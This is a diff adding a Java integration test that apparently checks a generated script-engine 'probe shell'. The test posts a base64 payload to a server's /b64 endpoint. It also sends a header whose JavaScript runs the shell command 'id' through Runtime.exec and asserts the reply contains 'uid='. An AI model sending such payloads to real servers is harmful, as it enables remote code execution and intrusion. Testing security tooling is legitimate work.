@@ -110,4 +110,36 @@ public class ProbeAssertion {
             ));
         }
     }
+
+    @SneakyThrows
+    public static void responseScriptEngineIsOk(String url, String server, int targetJreVersion) {
+        ProbeConfig probeConfig = ProbeConfig.builder()
+                .probeMethod(ProbeMethod.ResponseBody)
+                .probeContent(ProbeContent.ScriptEngine)
+                .debug(true)
+                .shrink(true)
+                .staticInitialize(true)
+                .targetJreVersion(targetJreVersion)
+                .build();
+        String headerName = "X-Header";
+        ResponseBodyConfig responseBodyConfig = ResponseBodyConfig.builder()
+                .server(server)
+                .reqParamName(headerName)
+                .build();
+        ProbeShellResult probeResult = ProbeShellGenerator.generate(probeConfig, responseBodyConfig);
+        String content = probeResult.getShellBytesBase64Str();
+        RequestBody requestBody = new FormBody.Builder()
+                .add("data", content)
+                .build();
+        Request request = new Request.Builder()
+                .header("Content-Type", "application/x-www-form-urlencoded")
+                .header(headerName, "new java.util.Scanner(java.lang.Runtime.getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()")
+                .url(url + "/b64").post(requestBody)
+                .build();
+        try (Response response = new OkHttpClient().newCall(request).execute()) {
+            assertThat(response.body().string(), anyOf(
+                    containsString("uid=")
+            ));
+        }
+    }
 }
